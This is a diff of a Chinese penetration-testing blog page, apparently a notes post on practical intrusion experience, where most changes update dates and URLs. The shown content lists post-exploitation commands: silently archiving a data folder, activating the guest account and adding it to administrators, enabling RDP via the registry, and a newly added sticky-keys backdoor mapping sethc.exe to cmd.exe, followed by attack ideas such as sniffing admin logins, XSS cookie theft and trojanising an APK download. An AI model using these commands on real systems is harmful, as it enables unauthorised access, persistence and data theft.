@@ -239,7 +239,7 @@
   
   
   <div class="post-block">
-    <link itemprop="mainEntityOfPage" href="https://shentoux.github.io/2022/11/23/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E4%B9%8B%E5%AE%9E%E6%88%98%E7%BB%8F%E9%AA%8C/">
+    <link itemprop="mainEntityOfPage" href="https://shentoux.github.io/2022/12/27/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E4%B9%8B%E5%AE%9E%E6%88%98%E7%BB%8F%E9%AA%8C/">
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
       <meta itemprop="name" content="">
@@ -258,7 +258,7 @@
         
           <h1 class="post-title" itemprop="name headline">
                 
-                <a class="post-title-link" href="/2022/11/23/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E4%B9%8B%E5%AE%9E%E6%88%98%E7%BB%8F%E9%AA%8C/" itemprop="url">渗透测试之实战经验</a></h1>
+                <a class="post-title-link" href="/2022/12/27/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E4%B9%8B%E5%AE%9E%E6%88%98%E7%BB%8F%E9%AA%8C/" itemprop="url">渗透测试之实战经验</a></h1>
         
 
         <div class="post-meta">
@@ -270,8 +270,8 @@
               
                 <span class="post-meta-item-text">发表于</span>
               
-              <time title="创建于" itemprop="dateCreated datePublished" datetime="2022-11-23T11:01:50+08:00">
-                2022-11-23
+              <time title="创建于" itemprop="dateCreated datePublished" datetime="2022-12-27T15:16:47+08:00">
+                2022-12-27
               </time>
             
 
@@ -289,8 +289,8 @@
                 <span class="post-meta-item-icon">
                   <i class="fa fa-comment-o"></i>
                 </span>
-                <a href="/2022/11/23/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E4%B9%8B%E5%AE%9E%E6%88%98%E7%BB%8F%E9%AA%8C/#comments" itemprop="discussionUrl">
-                  <span class="post-comments-count valine-comment-count" data-xid="/2022/11/23/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E4%B9%8B%E5%AE%9E%E6%88%98%E7%BB%8F%E9%AA%8C/" itemprop="commentCount"></span>
+                <a href="/2022/12/27/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E4%B9%8B%E5%AE%9E%E6%88%98%E7%BB%8F%E9%AA%8C/#comments" itemprop="discussionUrl">
+                  <span class="post-comments-count valine-comment-count" data-xid="/2022/12/27/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E4%B9%8B%E5%AE%9E%E6%88%98%E7%BB%8F%E9%AA%8C/" itemprop="commentCount"></span>
                 </a>
               </span>
             
@@ -452,7 +452,7 @@
 <h6 id="rar打包命令"><a href="#rar打包命令" class="headerlink" title="rar打包命令"></a>rar打包命令</h6><p>rar.exe a -ag -k -r -s -ibck c:&#x2F;bak.rar c:&#x2F;dat&#x2F;</p>
 <h6 id="msf-windows-shell乱码解决"><a href="#msf-windows-shell乱码解决" class="headerlink" title="msf windows shell乱码解决"></a>msf windows shell乱码解决</h6><p>输入chcp 65001</p>
 <h6 id="guest开启3389"><a href="#guest开启3389" class="headerlink" title="guest开启3389"></a>guest开启3389</h6><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">net user  guest  /active:yes                      <span class="comment">#激活guest用户</span></span><br><span class="line">net localgroup  administrators  guest  /add       <span class="comment">#将guest用户添加到administrators</span></span><br><span class="line">net user guest    密码                            <span class="comment">#更改guest用户密码</span></span><br><span class="line">REG ADD HKLM\SYSTEM\CurrentControlSet\Control\Terminal<span class="string">&quot; &quot;</span>Server /v fDenyTSConnections /t REG_DWORD /d <span class="number">00000000</span> /f   <span class="comment">#开启3389端口</span></span><br></pre></td></tr></table></figure>
-
+<h6 id="设置粘滞键后门"><a href="#设置粘滞键后门" class="headerlink" title="设置粘滞键后门"></a>设置粘滞键后门</h6><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">REG ADD <span class="string">&quot;HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\sethc.exe&quot;</span> /v Debugger /t REG_SZ /d <span class="string">&quot;C:\windows\system32\cmd.exe&quot;</span></span><br></pre></td></tr></table></figure>
 
 
 <h5 id="一些思路"><a href="#一些思路" class="headerlink" title="一些思路"></a>一些思路</h5><p>目前可进入目标网站后台和后续的渗透思路有以下一些：<br>1、修改后台登录入口嗅探登录的用户和密码；<br>2、通过加密算法生成密文字典进行撞库攻击；<br>3、通过加密算法生成密文后进入数据库修改；<br>4、XSS打Cookie或Flash水坑钓鱼等攻击方式；<br>5、APK中注入恶意程序，替换APK的下载地址；  </p>
